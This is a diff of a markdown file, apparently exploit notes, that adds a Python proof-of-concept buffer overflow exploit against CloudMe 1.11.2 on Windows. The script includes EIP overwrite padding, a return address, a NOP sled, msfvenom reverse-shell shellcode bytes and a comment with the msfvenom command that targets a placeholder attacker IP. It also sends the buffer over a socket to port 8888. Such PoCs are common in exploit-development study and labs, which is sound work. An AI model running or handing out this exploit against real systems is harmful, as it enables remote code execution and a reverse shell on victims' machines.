@@ -180,6 +180,26 @@ python3 cloudme_exploit.py
 
 
 ```py
+
+#Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
+# Date: 2020-04-27
+# Exploit Author: Andy Bowden
+# Vendor Homepage: https://www.cloudme.com/en
+# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
+# Version: CloudMe 1.11.2
+# Tested on: Windows 10 x86
+
+#Instructions:
+# Start the CloudMe service and run the script.
+
+import socket
+
+target = "127.0.0.1"
+
+padding1   = b"\x90" * 1052
+EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
+NOPS       = b"\x90" * 30
+
 # msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -b '\x00\x0A\x0D' -f python
 buf =  b""
 buf += b"\xd9\xeb\xba\x2a\x18\xb0\x34\xd9\x74\x24\xf4\x5e"
@@ -218,9 +238,10 @@ overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
 buf = padding1 + EIP + NOPS + payload + overrun
 
 try:
-        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target,8888))
-        s.send(buf)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(buf)
 except Exception as e:
-        print(sys.exc_value)
+	print(sys.exc_value)
+
 ```
